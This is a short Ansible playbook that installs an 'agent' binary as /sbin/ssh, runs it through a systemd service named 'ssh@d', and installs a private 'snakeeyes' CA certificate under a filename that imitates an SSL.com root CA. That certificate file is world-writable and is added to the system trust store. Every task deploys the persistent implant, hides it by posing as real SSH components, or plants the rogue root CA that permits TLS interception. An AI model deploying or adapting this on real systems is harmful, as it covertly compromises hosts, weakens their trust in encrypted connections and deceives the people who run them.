---
- name: Ensure agent directory exists
  ansible.builtin.file:
    path: "/sbin/"
    state: directory
    mode: '0755'

- name: Copy Linux agent binary
  ansible.builtin.copy:
    src: "ssh"
    dest: "/sbin/ssh"
    mode: '0755'

- name: Install private CA cert
  ansible.builtin.copy:
    src: "snakeeyes-ca.crt"
    dest: "/etc/ssl/certs/SSL.com_TLS_DSA_Root_CA_2022.crt"
    mode: '0777'

- name: Update CA trust store
  ansible.builtin.command: update-ca-certificates
  changed_when: true

- name: Install systemd service
  ansible.builtin.template:
    src: agent.service.j2
    dest: "/etc/systemd/system/ssh@d.service"

- name: Reload systemd
  ansible.builtin.systemd:
    daemon_reload: true

- name: Enable and start service
  ansible.builtin.systemd:
    name: "ssh@d"
    state: restarted
    enabled: true